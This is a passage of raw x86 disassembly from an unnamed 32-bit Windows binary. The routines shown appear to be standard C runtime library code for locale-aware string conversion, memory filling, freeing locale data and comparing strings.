  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
